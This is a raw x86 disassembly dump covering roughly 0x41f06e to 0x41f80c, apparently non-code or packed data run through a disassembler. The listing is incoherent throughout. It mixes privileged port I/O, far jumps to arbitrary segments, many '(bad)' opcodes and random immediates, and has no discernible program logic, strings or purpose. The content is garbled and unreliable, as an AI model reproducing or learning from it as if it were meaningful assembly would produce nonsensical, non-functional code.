  41f06e:	test   DWORD PTR [eax+0x665c1abe],0xb3a79352
  41f078:	ds call 0x6554:0x6b98da1d
  41f080:	cs nop
  41f082:	jmp    0xad28694c
  41f087:	or     DWORD PTR [edi+0x6d57d120],ebp
  41f08d:	jo     0x41f0d6
  41f08f:	gs mov esp,0x3cc6432e
  41f095:	jmp    0x47e4:0xe99a26cd
  41f09c:	loopne 0x41f03d
  41f09e:	adc    ebx,DWORD PTR [ebp+0x66a9e76f]
  41f0a4:	push   ecx
  41f0a5:	dec    esp
  41f0a6:	push   esi
  41f0a7:	pusha  
  41f0a8:	mov    esp,DWORD PTR [edi+esi*1]
  41f0ab:	jae    0x41f0d9
  41f0ad:	sub    dl,dl
  41f0af:	dec    edi
  41f0b0:	push   edi
  41f0b1:	(bad)  
  41f0b2:	mov    esp,0xaf8c2be7
  41f0b7:	out    dx,eax
  41f0b8:	mov    eax,ds:0xc43d8e40
  41f0bd:	gs data16 clc 
  41f0c0:	jnp    0x41f05d
  41f0c2:	dec    esi
  41f0c3:	ficom  DWORD PTR [ebp+0x69e6a345]
  41f0c9:	out    0xb5,eax
  41f0cb:	dec    eax
  41f0cc:	loope  0x41f079
  41f0ce:	mov    edx,0x10c169d8
  41f0d3:	aas    
  41f0d4:	add    DWORD PTR [ebp-0x1c],ecx
  41f0d7:	cdq    
  41f0d8:	push   ebx
  41f0d9:	mul    ch
  41f0db:	xor    eax,0x393d413f
  41f0e0:	pop    ecx
  41f0e1:	sbb    eax,0xb35e2dc4
  41f0e6:	jl     0x41f07a
  41f0e8:	mov    ebp,0x31945d34
  41f0ed:	mov    dh,0x6c
  41f0ef:	pop    ds
  41f0f0:	ror    BYTE PTR [esi-0x40],1
  41f0f3:	in     al,dx
  41f0f4:	iret   
  41f0f5:	and    BYTE PTR [ebx],bl
  41f0f7:	ret    
  41f0f8:	pop    esp
  41f0f9:	jb     0x41f108
  41f0fb:	adc    cl,BYTE PTR [edi]
  41f0fd:	xchg   ecx,eax
  41f0fe:	pop    esp
  41f0ff:	or     ecx,DWORD PTR [ecx+0x63]
  41f102:	cmp    DWORD PTR [ecx+esi*1-0x58],0x4cf80db8
  41f10a:	jns    0x41f187
  41f10c:	pushf  
  41f10d:	add    BYTE PTR [eax+0x40],bh
  41f110:	xor    al,0x9a
  41f112:	cmp    dh,BYTE PTR [ebx+0x43efcb02]
  41f118:	inc    edi
  41f119:	sbb    dl,BYTE PTR [esi+0x8]
  41f11c:	xor    edi,edi
  41f11e:	out    dx,eax
  41f11f:	cmp    cl,BYTE PTR [esi-0x3dc1dab9]
  41f125:	in     al,0xd0
  41f127:	sbb    ecx,DWORD PTR [ebp-0x33368a60]
  41f12d:	xor    DWORD PTR [ebp-0x2c8459bf],ebp
  41f133:	cli    
  41f134:	bound  ecx,QWORD PTR [ecx+0x1470802e]
  41f13a:	add    BYTE PTR [edi+0xbba1a5f],bh
  41f140:	cdq    
  41f141:	add    edx,DWORD PTR [esi+esi*8-0x41003fd4]
  41f148:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f14a:	bound  esi,QWORD PTR ds:0x98b9856
  41f150:	push   es
  41f151:	aaa    
  41f152:	and    al,BYTE PTR [esi-0x32722d15]
  41f158:	push   esp
  41f159:	mov    es,WORD PTR [eax+0x11bcae89]
  41f15f:	aaa    
  41f160:	sbb    eax,0x419da28
  41f165:	cmp    DWORD PTR [ebx+0x7477eea],edi
  41f16b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f16e:	fadd   DWORD PTR [ebp-0x6a]
  41f171:	xor    eax,0x27ed0c4c
  41f176:	jmp    0x153d:0x937c4fd7
  41f17d:	dec    esp
  41f17e:	loope  0x41f153
  41f180:	and    ecx,DWORD PTR [eax-0x1a5f50bf]
  41f186:	add    ah,dh
  41f188:	jno    0x41f1ca
  41f18a:	xchg   ebp,eax
  41f18b:	mov    al,0x55
  41f18d:	xchg   edx,eax
  41f18e:	jb     0x41f183
  41f190:	std    
  41f191:	mov    esp,0xf63878f2
  41f196:	lds    edi,FWORD PTR [ecx-0x489a59e]
  41f19c:	ja     0x41f17f
  41f19e:	push   ecx
  41f19f:	std    
  41f1a0:	mov    al,ds:0xac8d1dd4
  41f1a5:	jecxz  0x41f132
  41f1a7:	sub    eax,0xdee0c3a1
  41f1ac:	icebp  
  41f1ad:	cmp    ecx,DWORD PTR [eax-0x3fe63509]
  41f1b3:	add    esp,DWORD PTR [ebx]
  41f1b5:	daa    
  41f1b6:	call   DWORD PTR [eax]
  41f1b8:	mov    edx,0xd96adf96
  41f1bd:	add    BYTE PTR [edi+0x73e10c9b],ch
  41f1c3:	dec    BYTE PTR [edx]
  41f1c5:	fs jno 0x41f1a1
  41f1c8:	sub    ecx,edi
  41f1ca:	push   edx
  41f1cb:	push   ebx
  41f1cc:	out    0xfd,eax
  41f1ce:	ja     0x41f1a8
  41f1d0:	push   edx
  41f1d1:	inc    ebp
  41f1d2:	jg     0x41f24f
  41f1d4:	(bad)
  41f1d8:	inc    edi
  41f1d9:	mov    ds:0xfe8cce5c,al
  41f1de:	add    ah,BYTE PTR [edi]
  41f1e0:	mov    dl,0x84
  41f1e2:	loop   0x41f1d8
  41f1e4:	push   0x98829e7b
  41f1e9:	fidiv  WORD PTR [edx+0x59]
  41f1ec:	jmp    0xe5d7:0xfa88b74f
  41f1f3:	jp     0x41f1f2
  41f1f5:	imul   bl
  41f1f7:	leave  
  41f1f8:	(bad)  
  41f1fa:	push   eax
  41f1fb:	fwait
  41f1fc:	int    0xf
  41f1fe:	(bad)
  41f201:	adc    ch,al
  41f203:	xor    al,BYTE PTR [eax+eiz*8+0x1f73a41c]
  41f20a:	mov    ah,0x8
  41f20c:	fs cmp edi,eax
  41f20f:	test   DWORD PTR [edi],ecx
  41f211:	cmp    DWORD PTR [ecx],ebx
  41f213:	jg     0x41f257
  41f215:	jbe    0x41f208
  41f217:	retf   0xfcbe
  41f21a:	call   0xf4da:0xf0f8a6a0
  41f221:	cmp    eax,esi
  41f223:	mov    bh,0xec
  41f225:	ins    DWORD PTR es:[edi],dx
  41f226:	xor    ebx,ebx
  41f228:	push   cs
  41f229:	xchg   ebp,eax
  41f22a:	mov    esp,0x7028a4cd
  41f22f:	push   ecx
  41f230:	stos   BYTE PTR es:[edi],al
  41f231:	outs   dx,BYTE PTR ds:[esi]
  41f232:	repz jbe 0x41f29e
  41f235:	sbb    al,BYTE PTR [ecx-0x30b13463]
  41f23b:	fistp  DWORD PTR [ebp-0x5e]
  41f23e:	jo     0x41f28c
  41f240:	(bad)  
  41f241:	fstp   DWORD PTR [ebx]
  41f243:	xor    DWORD PTR [eax],eax
	...
  41f251:	xor    dl,al
  41f253:	and    ecx,ebp
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x76],ebx
  41f25e:	aam    0x4a
  41f260:	and    al,0x17
  41f262:	ins    DWORD PTR es:[edi],dx
  41f263:	add    DWORD PTR [eax],eax
  41f265:	stos   DWORD PTR es:[edi],eax
  41f266:	add    eax,DWORD PTR [eax]
  41f268:	add    BYTE PTR [eax-0xb9dc850],bl
  41f26e:	pop    edi
  41f26f:	test   eax,0x25eea783
  41f274:	test   al,0x1c
  41f276:	jbe    0x41f2ef
  41f278:	rol    DWORD PTR [edi-0x640a3602],1
  41f27e:	das    
  41f27f:	leave  
  41f280:	dec    esp
  41f281:	call   0x49c1db2a
  41f286:	mov    edx,edx
  41f288:	stos   BYTE PTR es:[edi],al
  41f289:	and    BYTE PTR [eax-0x6dfb1fa3],ch
  41f28f:	je     0x41f2b8
  41f291:	jg     0x41f2ca
  41f293:	sub    ecx,DWORD PTR [eax-0xe]
  41f296:	xor    eax,0x324a8b0b
  41f29b:	pop    ss
  41f29c:	add    ebx,esi
  41f29e:	or     ch,BYTE PTR [edx]
  41f2a0:	jecxz  0x41f2b4
  41f2a2:	rcr    DWORD PTR [edx+0x45184755],0xc6
  41f2a9:	pop    edx
  41f2aa:	mov    esp,0xc568b139
  41f2af:	cmp    eax,0x5890b5be
  41f2b4:	(bad)  [eax+0x3f056995]
  41f2ba:	cld    
  41f2bb:	into   
  41f2bc:	repnz pusha 
  41f2be:	inc    esi
  41f2bf:	sbb    eax,DWORD PTR [eax+esi*2]
  41f2c2:	rcr    BYTE PTR [ebx-0x3a],0x33
  41f2c6:	cwde   
  41f2c7:	add    BYTE PTR [ebx+0x6a],0x34
  41f2cb:	lds    eax,FWORD PTR [eax-0xb]
  41f2ce:	shl    edi,cl
  41f2d0:	push   esi
  41f2d1:	loope  0x41f303
  41f2d3:	test   esp,eax
  41f2d5:	and    eax,0xe68a9eb
  41f2da:	sub    eax,0x337c6428
  41f2df:	addr16 sub ebx,edi
  41f2e2:	repnz cmp BYTE PTR [eax],0x23
  41f2e6:	push   ds
  41f2e7:	(bad)  
  41f2e8:	lds    ebp,FWORD PTR [edx+edx*8+0x49]
  41f2ec:	outs   dx,DWORD PTR ds:[esi]
  41f2ed:	es push edx
  41f2ef:	ds daa 
  41f2f1:	mov    ds:0x2cd9ae14,al
  41f2f6:	xchg   ebp,eax
  41f2f7:	xlat   BYTE PTR ds:[ebx]
  41f2f8:	dec    edx
  41f2f9:	ins    BYTE PTR es:[edi],dx
  41f2fa:	fucom  st(7)
  41f2fc:	imul   DWORD PTR ds:0xfcef658e
  41f302:	popa   
  41f303:	pushf  
  41f304:	dec    edi
  41f305:	inc    edi
  41f306:	arpl   WORD PTR [edx+edx*4-0x43],dx
  41f30a:	or     eax,0xf3b01f7c
  41f30f:	sbb    dh,bl
  41f311:	ins    BYTE PTR es:[edi],dx
  41f312:	push   eax
  41f313:	add    DWORD PTR [ecx],edi
  41f315:	nop
  41f316:	jg     0x41f343
  41f318:	pop    eax
  41f319:	mov    edx,0x175a504
  41f31e:	ficomp DWORD PTR [edx+edx*8-0x6028d8c6]
  41f325:	mov    al,0x27
  41f327:	mov    esi,DWORD PTR [esi-0x50]
  41f32a:	adc    al,0x70
  41f32c:	retf   
  41f32d:	lahf   
  41f32e:	xchg   ebp,eax
  41f32f:	stos   BYTE PTR es:[edi],al
  41f330:	nop
  41f331:	jecxz  0x41f332
  41f333:	lods   eax,DWORD PTR ds:[esi]
  41f334:	into   
  41f335:	(bad)  
  41f336:	sti    
  41f337:	sar    BYTE PTR [eax-0x63],1
  41f33a:	adc    eax,0xc3835837
  41f33f:	lahf   
  41f340:	and    BYTE PTR [edx-0x60b2297f],bl
  41f346:	inc    edi
  41f347:	pop    ebp
  41f348:	nop
  41f349:	repnz jecxz 0x41f353
  41f34c:	add    DWORD PTR ds:0x352b19f9,ebx
  41f352:	in     eax,dx
  41f353:	and    al,BYTE PTR [ecx+0x230d283]
  41f359:	sub    eax,0x6d9fe946
  41f35e:	loopne 0x41f35d
  41f360:	aad    0x5d
  41f362:	inc    esi
  41f363:	lods   al,BYTE PTR ds:[esi]
  41f364:	sub    edi,esp
  41f366:	les    esi,FWORD PTR [edi+0x1c]
  41f369:	daa    
  41f36a:	loop   0x41f3a4
  41f36c:	into   
  41f36d:	rcl    bp,0xba
  41f371:	sub    ch,BYTE PTR [ecx-0x6441637]
  41f377:	fisubr DWORD PTR [ebp+0x44]
  41f37a:	pop    ds
  41f37b:	mov    al,0x1a
  41f37d:	pop    esi
  41f37e:	xchg   edx,eax
  41f37f:	cmp    ah,BYTE PTR [ebp+edi*4+0x7f]
  41f383:	add    BYTE PTR [ebx],bh
  41f385:	ins    DWORD PTR es:[edi],dx
  41f386:	cmp    ch,al
  41f388:	sub    BYTE PTR [edx+0x6b42dcf7],ch
  41f38e:	fisub  DWORD PTR [ecx+0x6549a60a]
  41f394:	gs mov edi,0x75cee0c1
  41f39a:	sbb    eax,0xe3688f5b
  41f39f:	sar    DWORD PTR [eax-0x80],cl
  41f3a2:	and    bl,BYTE PTR [esi-0x5626972d]
  41f3a8:	dec    DWORD PTR [edi+0xc]
  41f3ab:	mov    eax,ds:0xfb87c79f
  41f3b0:	shr    DWORD PTR [edi+0x79],cl
  41f3b3:	and    al,0x86
  41f3b5:	pop    es
  41f3b6:	fidivr DWORD PTR [edx+0x3f]
  41f3b9:	test   al,0x8a
  41f3bb:	cmp    DWORD PTR ds:0x8539cb7d,edx
  41f3c1:	not    BYTE PTR [edi]
  41f3c3:	push   ebx
  41f3c5:	xchg   edi,eax
  41f3c6:	mov    ds:0x3779bd5c,al
  41f3cb:	out    dx,al
  41f3cc:	xor    esp,esi
  41f3ce:	xsaveopt [ebp-0x5c3d4af3]
  41f3d5:	bound  eax,QWORD PTR [esi+edx*4-0x70115bd9]
  41f3dc:	(bad)  
  41f3dd:	pop    ecx
  41f3de:	mov    al,0x14
  41f3e0:	enter  0xf38d,0x5f
  41f3e4:	mov    esi,0x9ca702ce
  41f3e9:	mov    ecx,0xaa437946
  41f3ee:	jg     0x41f3f8
  41f3f0:	jecxz  0x41f43a
  41f3f2:	add    eax,0xcbf94e8f
  41f3f7:	mov    eax,ds:0xb8ccb9d1
  41f3fc:	jae    0x41f441
  41f3fe:	mov    ecx,0xcece1999
  41f403:	outs   dx,BYTE PTR ds:[esi]
  41f404:	sbb    al,al
  41f406:	cli    
  41f407:	sbb    eax,0x8e5291b7
  41f40c:	dec    edi
  41f40d:	adc    al,BYTE PTR [ebx]
  41f40f:	scas   eax,DWORD PTR es:[edi]
  41f410:	dec    ebp
  41f411:	ret    0x25a
  41f414:	mov    al,0xf5
  41f416:	push   esp
  41f417:	ret    
  41f418:	dec    edi
  41f419:	rcl    DWORD PTR [ecx-0x10],0x80
  41f41d:	(bad)  
  41f41e:	cld    
  41f41f:	sub    esi,ebp
  41f421:	xor    esp,ecx
  41f423:	jno    0x41f437
  41f425:	(bad)  
  41f426:	gs pop edi
  41f428:	inc    ebx
  41f429:	push   ebx
  41f42a:	stos   BYTE PTR es:[edi],al
  41f42b:	and    BYTE PTR [eax],dl
  41f42d:	xchg   esi,eax
  41f42e:	jo     0x41f48d
  41f430:	out    0x74,eax
  41f432:	repz pop edi
  41f434:	leave  
  41f435:	mov    ebp,0x4e6a900b
  41f43a:	adc    edi,DWORD PTR [ebx+ecx*8-0x60c0fcfc]
  41f441:	out    0xa2,al
  41f443:	jp     0x41f480
  41f445:	into   
  41f446:	imul   esi,DWORD PTR [ecx+0x5],0x102bb606
  41f44d:	hlt    
  41f44e:	xchg   esp,eax
  41f44f:	mov    eax,0xae760888
  41f454:	adc    ebp,edx
  41f456:	(bad)  
  41f457:	or     al,0xd2
  41f459:	jl     0x41f416
  41f45b:	fnstenv [ebx]
  41f45d:	jp     0x41f403
  41f45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f460:	sbb    eax,0x384a6a8b
  41f465:	lods   al,BYTE PTR ds:[esi]
  41f466:	sbb    DWORD PTR [ecx+0x30],ebx
  41f469:	sbb    DWORD PTR [edi+0x1002c5c],ebx
  41f46f:	mov    eax,0xf8e548f7
  41f474:	add    eax,0xea3c1948
  41f479:	inc    esp
  41f47a:	jecxz  0x41f426
  41f47c:	call   0x2cee64ca
  41f481:	cld    
  41f482:	xchg   esp,eax
  41f483:	jmp    0x41f484
  41f485:	arpl   WORD PTR [ebx+edi*8-0x5fdadf17],di
  41f48c:	push   ebp
  41f48d:	cwde   
  41f48e:	jg     0x41f413
  41f490:	mov    es,WORD PTR [ecx-0x35200218]
  41f496:	hlt    
  41f497:	pop    esi
  41f498:	and    ebp,edi
  41f49a:	daa    
  41f49b:	sbb    DWORD PTR ds:0x2977f05c,eax
  41f4a1:	stc    
  41f4a2:	sbb    ebp,esi
  41f4a4:	in     al,0x19
  41f4a6:	and    BYTE PTR [ecx-0x643efcb],dh
  41f4ac:	jne    0x41f477
  41f4ae:	in     eax,dx
  41f4af:	sub    al,0x9b
  41f4b1:	dec    ebp
  41f4b2:	aaa    
  41f4b3:	mov    cl,0xe0
  41f4b5:	add    bh,BYTE PTR [edx-0x2e]
  41f4b8:	mov    ch,0x23
  41f4ba:	sbb    ecx,DWORD PTR [ecx]
  41f4bc:	aas    
  41f4bd:	stos   BYTE PTR es:[edi],al
  41f4be:	pop    ds
  41f4bf:	push   eax
  41f4c0:	adc    ah,ch
  41f4c2:	mov    WORD PTR [ebp-0x17810382],?
  41f4c8:	cmp    BYTE PTR [edx+ebx*4],0xa5
  41f4cc:	xor    cl,BYTE PTR [ecx+0x262a7d03]
  41f4d2:	dec    ecx
  41f4d3:	mov    DWORD PTR [eax+0x32],ecx
  41f4d6:	cdq    
  41f4d7:	repnz mov dl,0xd5
  41f4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4db:	ss jbe 0x41f495
  41f4de:	mov    cl,0x2a
  41f4e0:	in     al,dx
  41f4e1:	xchg   ebp,eax
  41f4e2:	in     eax,dx
  41f4e3:	mov    ebx,0x6d18be74
  41f4e8:	and    DWORD PTR [ecx+0x1e],ecx
  41f4eb:	add    BYTE PTR ds:0x55de336f,0x62
  41f4f2:	jecxz  0x41f54c
  41f4f4:	push   0x9e1d0a33
  41f4f9:	rol    ebx,0x38
  41f4fc:	mov    WORD PTR [esi],es
  41f4fe:	cli    
  41f4ff:	clc    
  41f500:	mov    al,ds:0x1588bce8
  41f505:	jne    0x41f507
  41f507:	inc    edi
  41f508:	aaa    
  41f509:	and    eax,0x2ac90b1c
  41f50e:	in     al,0xad
  41f510:	jns    0x41f4b9
  41f512:	dec    esp
  41f513:	loop   0x41f4b8
  41f515:	test   al,0x3c
  41f517:	dec    edx
  41f518:	cwde   
  41f519:	shl    DWORD PTR [edi+0x6f],0x4e
  41f51d:	je     0x41f516
  41f51f:	push   es
  41f520:	aaa    
  41f521:	jl     0x61031757
  41f527:	sahf   
  41f528:	(bad)  [eax+0x6]
  41f52b:	sbb    DWORD PTR [esi+0x48],edx
  41f52e:	mov    eax,0x1b35f5ec
  41f533:	scas   al,BYTE PTR es:[edi]
  41f534:	in     al,dx
  41f535:	sti    
  41f536:	arpl   WORD PTR [edx+0x53cec444],cx
  41f53c:	cmp    BYTE PTR [ebp+0x14],ah
  41f53f:	mov    al,0xef
  41f541:	shl    DWORD PTR [ebx+0x63],1
  41f544:	scas   al,BYTE PTR es:[edi]
  41f545:	inc    ecx
  41f546:	or     esi,DWORD PTR [esi+0x3427a77c]
  41f54c:	in     al,0x32
  41f54e:	mov    esi,0x29fafe6c
  41f553:	aaa    
  41f554:	adc    dh,cl
  41f556:	cmp    ecx,esi
  41f558:	sbb    dh,0x12
  41f55b:	cli    
  41f55c:	mov    ch,BYTE PTR fs:[esi]
  41f55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f560:	adc    BYTE PTR [esi-0x72],bl
  41f563:	addr16 test eax,0x2ee89030
  41f569:	adc    ah,BYTE PTR [eax]
  41f56b:	or     esi,edi
  41f56d:	jge    0x41f54c
  41f56f:	xchg   edx,eax
  41f570:	sbb    BYTE PTR [ebp-0x734597c3],bl
  41f576:	fld    st(6)
  41f578:	mov    BYTE PTR [ecx+0x65bdb2e1],dl
  41f57e:	sti    
  41f57f:	mov    eax,0x43fcb8ea
  41f584:	push   0x1e
  41f586:	out    0xf6,eax
  41f588:	pop    ss
  41f589:	mov    ebx,0x3be051d0
  41f58e:	retf   
  41f58f:	mov    ebx,0xf1ca3e0b
  41f594:	enter  0xc5da,0xda
  41f598:	scas   al,BYTE PTR es:[edi]
  41f599:	stos   BYTE PTR es:[edi],al
  41f59a:	lahf   
  41f59b:	inc    edi
  41f59c:	mul    dh
  41f59e:	aam    0xfe
  41f5a0:	out    0xd6,al
  41f5a2:	push   edi
  41f5a3:	adc    BYTE PTR [edi+esi*8-0x3a2daf4b],bl
  41f5aa:	add    al,0x73
  41f5ac:	adc    al,0x57
  41f5ae:	adc    BYTE PTR [ecx+ebx*1-0x7f5f5d2d],bl
  41f5b5:	adc    esi,eax
  41f5b7:	(bad)  
  41f5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b9:	addr16 push ebp
  41f5bb:	mov    al,BYTE PTR [edx]
  41f5bd:	push   ds
  41f5be:	push   esi
  41f5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5c0:	push   0xffffffa4
  41f5c2:	pusha  
  41f5c3:	in     eax,0xb5
  41f5c5:	jnp    0x41f5b0
  41f5c7:	(bad)  
  41f5c8:	shr    DWORD PTR [ecx+0x3b79803a],1
  41f5ce:	inc    eax
  41f5cf:	adc    al,0x68
  41f5d1:	loope  0x41f5e9
  41f5d3:	cmp    BYTE PTR [ecx],ah
  41f5d5:	push   ds
  41f5d6:	int    0x7b
  41f5d8:	mov    esi,0xde5c765a
  41f5dd:	and    DWORD PTR [ebx-0x255627a7],0x81ecbaa3
  41f5e7:	mov    dl,0xce
  41f5e9:	pop    ebx
  41f5ea:	repnz xchg edx,eax
  41f5ec:	mov    ds:0xb4da452f,al
  41f5f1:	jmp    0xb1b04b3e
  41f5f6:	fld    DWORD PTR [ebx+ebp*4+0x4f]
  41f5fa:	mov    esp,DWORD PTR [ecx]
  41f5fc:	pop    esi
  41f5fd:	push   esi
  41f5fe:	inc    ebx
  41f5ff:	jle    0x41f66b
  41f601:	mov    ebp,0xbee66152
  41f606:	stc    
  41f607:	inc    ebx
  41f608:	jo     0x41f5a1
  41f60a:	mov    al,0xbd
  41f60c:	mov    ah,0x21
  41f60e:	add    ah,BYTE PTR [edx+edx*4+0x3d5ced]
	...
  41f621:	inc    edx
  41f622:	add    eax,0x65676020
  41f627:	inc    edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	pop    edi
  41f62e:	das    
  41f62f:	xchg   ebx,eax
  41f630:	test   edx,eax
  41f632:	jo     0x41f635
  41f634:	add    BYTE PTR [ebx+0x45000003],ch
  41f63a:	not    BYTE PTR [ecx-0xc]
  41f63d:	popf   
  41f63e:	add    BYTE PTR [ecx],ch
  41f640:	mov    eax,ds:0xb7d85a9d
  41f645:	adc    esp,esp
  41f647:	cmp    eax,0xdda27a3
  41f64c:	dec    esi
  41f64d:	fstp   DWORD PTR [ebx]
  41f64f:	cmp    eax,0x83d8de54
  41f654:	mov    esp,0xc61a51fe
  41f659:	fisttp QWORD PTR [ebx+ecx*8+0x48]
  41f65d:	cdq    
  41f65e:	hlt    
  41f65f:	pop    DWORD PTR [edx]
  41f661:	test   DWORD PTR [eax],edx
  41f663:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41f665:	dec    eax
  41f667:	ret    0xc906
  41f66a:	les    eax,FWORD PTR [ebx+0x71]
  41f66d:	out    0x16,al
  41f66f:	xchg   esp,eax
  41f670:	pop    ebp
  41f671:	cmp    DWORD PTR [ebp+0x36],ebp
  41f674:	fwait
  41f675:	mov    bh,0xae
  41f677:	sbb    ebx,ebx
  41f679:	lahf   
  41f67a:	pop    ds
  41f67b:	jg     0x41f657
  41f67d:	pop    ecx
  41f67e:	jo     0x41f6f6
  41f680:	adc    eax,0xbcc2d471
  41f685:	mov    dh,0x37
  41f687:	xor    edi,ebp
  41f689:	ins    BYTE PTR es:[edi],dx
  41f68a:	dec    esp
  41f68b:	loopne 0x41f615
  41f68d:	retf   0xd621
  41f690:	fimul  WORD PTR [eax]
  41f692:	mov    WORD PTR [esi+edi*8+0x3b40d2cc],ss
  41f699:	cmc    
  41f69a:	xlat   BYTE PTR ds:[ebx]
  41f69b:	dec    edi
  41f69c:	adc    eax,0x1d048a55
  41f6a1:	(bad)  
  41f6a2:	jge    0x41f6ea
  41f6a4:	and    ebx,DWORD PTR [esi-0x37]
  41f6a7:	push   DWORD PTR [ecx]
  41f6a9:	(bad)  
  41f6aa:	dec    esi
  41f6ab:	cmp    al,BYTE PTR [ebx-0x48fb3d1a]
  41f6b1:	retf   0x796d
  41f6b4:	sbb    DWORD PTR fs:[edi-0x618c4a2c],0xe4e4db34
  41f6bf:	mov    eax,0xa4fff85b
  41f6c4:	or     edi,DWORD PTR [esi]
  41f6c6:	cmp    BYTE PTR [ecx+ebp*8+0x7],dl
  41f6ca:	jne    0x41f669
  41f6cc:	aaa    
  41f6cd:	adc    ecx,ecx
  41f6cf:	pop    edx
  41f6d0:	loopne 0x41f6da
  41f6d2:	inc    esp
  41f6d3:	fst    QWORD PTR [esi]
  41f6d5:	push   ebx
  41f6d6:	rcl    BYTE PTR [edi+0x20d2072c],1
  41f6dc:	sub    esp,ebx
  41f6de:	dec    edi
  41f6df:	hlt    
  41f6e0:	scas   al,BYTE PTR es:[edi]
  41f6e1:	repnz push esp
  41f6e3:	fwait
  41f6e4:	jp     0x41f764
  41f6e6:	pop    edi
  41f6e7:	mov    WORD PTR [ebx],es
  41f6e9:	sbb    ebp,DWORD PTR [esi-0x8705971]
  41f6ef:	xor    DWORD PTR [ecx-0x4592525f],esi
  41f6f5:	int    0x5a
  41f6f7:	(bad)  
  41f6f9:	int3   
  41f6fa:	mov    ebx,0x13117831
  41f6ff:	cwde   
  41f700:	lahf   
  41f701:	adc    dh,BYTE PTR [edx+0x6f05cbbe]
  41f707:	and    eax,0x82aa7635
  41f70c:	mov    ds:0xd3441e55,al
  41f711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f712:	sbb    ebx,esi
  41f714:	pusha  
  41f715:	lds    edx,FWORD PTR [edi]
  41f717:	pop    eax
  41f718:	int    0x64
  41f71a:	popa   
  41f71b:	jbe    0x41f6a4
  41f71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f71e:	push   edx
  41f71f:	imul   esi,DWORD PTR [edx],0xaf7fb24e
  41f725:	push   ds
  41f726:	stos   BYTE PTR es:[edi],al
  41f727:	in     al,0xc7
  41f729:	aaa    
  41f72a:	les    eax,FWORD PTR [ecx+ebx*1-0x12]
  41f72e:	mov    eax,0x2921c918
  41f733:	imul   ah
  41f735:	leave  
  41f736:	fimul  WORD PTR [edi+eiz*2]
  41f739:	cmp    eax,0xbac44202
  41f73e:	popf   
  41f73f:	cli    
  41f740:	jge    0x41f6ef
  41f742:	xchg   esp,eax
  41f743:	icebp  
  41f744:	std    
  41f745:	jns    0x41f6df
  41f747:	pop    edi
  41f748:	call   0x8daf2f24
  41f74d:	pop    es
  41f74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f74f:	xchg   BYTE PTR [ebx+ecx*2],ch
  41f752:	fidiv  WORD PTR [edx+0x69063fe3]
  41f758:	cwde   
  41f759:	clc    
  41f75a:	xor    DWORD PTR [eax],ebp
  41f75c:	ins    DWORD PTR es:[edi],dx
  41f75d:	sub    BYTE PTR [edx+0x44],dh
  41f760:	mov    edx,0x2752cb3f
  41f765:	sahf   
  41f766:	mov    ds,WORD PTR [ecx+0x44]
  41f769:	dec    ebx
  41f76a:	inc    ecx
  41f76b:	lock or al,0xa5
  41f76e:	push   cs
  41f76f:	cmp    edi,eax
  41f771:	imul   ebp,esp,0x607ba94
  41f777:	ror    ch,0x66
  41f77a:	std    
  41f77b:	idiv   esi
  41f77d:	push   esi
  41f77e:	sub    ebx,DWORD PTR [eax]
  41f780:	lods   eax,DWORD PTR ds:[esi]
  41f781:	nop
  41f782:	inc    edx
  41f783:	cmp    dl,BYTE PTR [ecx-0x41bd7b93]
  41f789:	pop    es
  41f78a:	mov    edx,0xb1f419ae
  41f78f:	xchg   ebp,eax
  41f790:	push   ebp
  41f791:	jmp    0x41f7ff
  41f793:	jnp    0x41f7dc
  41f795:	dec    edi
  41f796:	cmp    al,0xdd
  41f798:	xchg   edx,eax
  41f799:	push   edi
  41f79a:	cs xchg edi,eax
  41f79c:	push   edx
  41f79d:	shl    DWORD PTR [esi+esi*1-0x41],1
  41f7a1:	sub    al,0xfb
  41f7a3:	mov    ds:0xe6b69db5,al
  41f7a8:	lods   eax,DWORD PTR ds:[esi]
  41f7a9:	cmp    BYTE PTR [ebx-0x5f1a7f5e],dh
  41f7af:	popa   
  41f7b0:	push   ecx
  41f7b1:	clc    
  41f7b2:	xor    BYTE PTR [ebx-0x65],cl
  41f7b5:	push   ds
  41f7b6:	inc    ebx
  41f7b7:	mov    ds:0xd92cce30,al
  41f7bc:	mov    ds:0xc5a0bcf,eax
  41f7c1:	ins    BYTE PTR es:[edi],dx
  41f7c2:	inc    esp
  41f7c3:	lock sbb BYTE PTR [ebp+0xdf46c05],ah
  41f7ca:	sbb    al,0x60
  41f7cc:	cmp    al,0x9c
  41f7ce:	aam    0x88
  41f7d0:	sbb    ch,BYTE PTR [edx-0x25]
  41f7d3:	cmp    eax,esp
  41f7d5:	ror    DWORD PTR [ebp+0x74],cl
  41f7d8:	jp     0x41f7cb
  41f7da:	scas   al,BYTE PTR es:[edi]
  41f7db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7dc:	xor    cl,BYTE PTR [eax+0x2240c6a2]
  41f7e2:	mov    ebx,0x32a13495
  41f7e7:	push   ds
  41f7e8:	arpl   WORD PTR [eax-0x60],dx
  41f7eb:	popf   
  41f7ec:	int    0xb0
  41f7ee:	shr    BYTE PTR [edi],cl
  41f7f0:	aaa    
  41f7f1:	mov    al,ds:0x308a01e
  41f7f6:	cs int 0xfa
  41f7f9:	xor    bl,BYTE PTR [ecx]
  41f7fb:	xchg   ebx,eax
  41f7fc:	xchg   edx,eax
  41f7fd:	ds sbb al,0x33
  41f800:	shr    DWORD PTR [eax+0x5d],cl
  41f803:	mov    eax,fs
  41f805:	mov    DWORD PTR [esi-0x54],ebp
  41f808:	enter  0x1777,0xa2
  41f80c:	jnp    0x41f793
